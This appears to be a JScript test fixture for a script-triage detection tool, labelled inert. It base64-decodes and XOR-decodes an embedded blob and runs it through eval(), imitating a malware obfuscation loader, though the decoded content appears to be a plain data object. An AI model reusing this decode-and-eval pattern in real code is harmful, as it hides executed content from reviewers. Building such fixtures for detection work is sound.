// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_9c9bfe79 = function(item1) {
  var keyBytes = [73,192,56,8,173];
  var item2 = [];
  for (var i = 0; i < item1.length; i++) { item2.push(item1[i] ^ keyBytes[i % keyBytes.length]); }
  return item2;
};
var recover_825f92b7 = function() {
  var packedText = "MuJLfMg5sxoy9musV2vMPaVnZMIqoVQqgWuwSm3dKLJdV9k7oVZ7yyyyGiSPPLBUZ8wtn0ptwCa0XSrwZeJZbMw5tF16j3PidVv1BIwKJv4ssk5t3xGNdED5HZAWPoN54hQq2yisTW3ea/pDKs4orUhpxC6uZ2HJa/oaa8wksFlhyiftDT3IfKZdMJVx8BokjzyyVCqXa6hMfN06+hcnmHylDW7IcfgAOIMsuFll3SWlFmHDP6FUYclmo11qzHHzXTuDLaFMKoFrtUtt3xahX23DPeICKuU8rkx6yDqzdGnPZvUNbZgvpQAwlXniFCrLIKxdV90otFAql2uDAlTxHLNdet4VnGh9zyWpW1TxAbVWfN8ss0tEzCucZHvZKKddJZh8pQ1uyHH4ADiDLaFMKtBl4kt8zC6le2fYJ7QaMp40";

  var item1 = decodeBase64(packedText);

  var item6 = "PROCESSOR_ARCHITECTURE";

  var item2 = [];

  for (var pass = 0; pass < 1; pass++) { item2 = decode_9c9bfe79(item1); }

  var item3 = "", bi = 0;

  for (bi = 0; bi < item2.length; bi++) { item3 += String.fromCharCode(item2[bi]); }

  return item3;
};
var inspect_c18c4466 = function() {
  var item4 = eval("(" + recover_825f92b7() + ")");
  var item5 = new Object();
  item5.steps = item4.steps;
  item5["adapter"] = item4["adapter"];
  item5.values = item4.values;
  item5["stageCount"] = item4["stageCount"];
  return item5;
};
